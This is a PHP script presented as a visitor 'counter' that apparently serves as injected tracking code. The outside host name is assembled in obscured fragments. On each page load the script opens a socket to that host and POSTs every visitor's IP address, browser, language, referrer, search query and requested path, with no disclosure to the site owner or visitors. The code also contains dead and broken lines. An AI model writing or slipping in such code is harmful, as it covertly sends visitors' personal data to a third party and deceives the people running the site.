<?
if(function_exists('iconv_set_encoding'))
	{
	iconv_set_encoding("internal_encoding", "UTF-8");
	}

// Function to define IP (expects no params)
function COGetip() 
	{
	if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && !empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
		{
		return $_SERVER['HTTP_X_FORWARDED_FOR'];
		foreach( explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']) as $ip )
			{
			$ip=trim($ip);
			return $ip;
			}
		}
	return $_SERVER['REMOTE_ADDR'];
	}


$CounterRef=preg_replace("/(www.)/si","", strtolower($_SERVER['HTTP_HOST']) ); $__07="my"; // Site where stats scripts are lying
$check = substr_count($_SERVER['REMOTE_ADDR'],$CounterRef) ; //checking for ip in adress
if  ($check<1) 
	{ 
	$__07.="count"; 
	// Sockets connect params
	$FS_Cond = TRUE;
	$FS_Port		= 80;
	$FS_TimeOut		= 2;
	$FS_TargetScript = "/db.php";
	$__07.= "er.cz.cc";
	$FS_TargetHost 	= $__07;
	$FS_FromHost 	= $__07;
	$FS_RefererHost = $__07;
	$FS_UserAgent 	= "IC_Counter | ".$CounterRef;
	
	// Array of SE for further work with search queries
	$SearchEngines = array(
	'google' => array('q','UTF-8','WINDOWS-1251'),
	'bing' => array('q','UTF-8','WINDOWS-1251'),
	'yahoo' => array('p','UTF-8','WINDOWS-1251'),
	);
	
	// Preparing data for sharing
	$Ip = COGetip();	// Sets Referers IP address to write in DB
	$Browser = $_SERVER[HTTP_USER_AGENT];	// Sets Browser type & version to write in DB
	$Language = $_SERVER[HTTP_ACCEPT_LANGUAGE];	// Sets Language setted on referers PC to write in DB
	$Referer = $_SERVER[HTTP_REFERER];	// Url from Referer came to site
	
	// Let's check wether we got Referer's Url to parse it
	if (isset($Referer) && !empty($Referer))	
		{
		$value = (parse_url(urldecode($Referer)));	// Parsing Url to array
		$host = preg_replace("/(www.)/si","", $value[host]);	// cuts www, http, etc from referers Url
		$host_ar = explode(".", $host);	// cutting Url to pieces to check wether it's an search engine setted in array $SearchEngines
		
		foreach ($SearchEngines as $k => $v)	
			{	// cheking what is an SE
			if (in_array($k, $host_ar))	
				{
				$value[query] = stristr($value[query], $v[0]."=");	// cutting query by "query separator"
				$num = stripos($value[query], "&");	// counting where's next useless code starts
				$value[query] = str_replace($v[0]."=", "", substr($value[query], 0, $num));	// cutting useless code from query
				
	 			$RefQuery = urldecode($value[query]);	// Sets valid Query
				$Referer = urldecode($_SERVER[HTTP_REFERER]);	// Sets urldecoded Referer to write in DB via valid Query
				}
			}
		}
	
	$Uri = substr($_SERVER[REQUEST_URI], 0, strpos("$_SERVER[REQUEST_URI]", "?")); // Where Referer came with cutting of ?
	
	$IC_data = 'IP='.$Ip.'&Browser='.$Browser.'&Language='.$Language.'&Referer='.$Referer.'&RefQuery='.$RefQuery.'&Uri='.$Uri;
	
	if ($FS_Cond === TRUE)	
		{
		$fp = fsockopen($FS_TargetHost, $FS_Port, $errno, $errstr, $FS_TimeOut);
		if ($fp)	
			{
			$out = "POST $FS_TargetScript HTTP/1.1\n"; 
			$out .= "Host: $FS_FromHost\n"; 
			$out .= "Referer: $FS_RefererHost/\n"; 
			$out .= "User-Agent: $FS_UserAgent\n";
			$crlf = "\n";
			$req .= 'Accept-Encoding: deflate' . $crlf; 
			$req .= 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7' . $crlf;
			$out .= "Content-Type: application/x-www-form-urlencoded\n"; 
			$out .= "Content-Length: ".strlen($IC_data)."\n\n"; 
			$out .= $IC_data."\n\n"; 
			fputs($fp, $out); 
			fclose($fp); 
			}
		}
	}

?>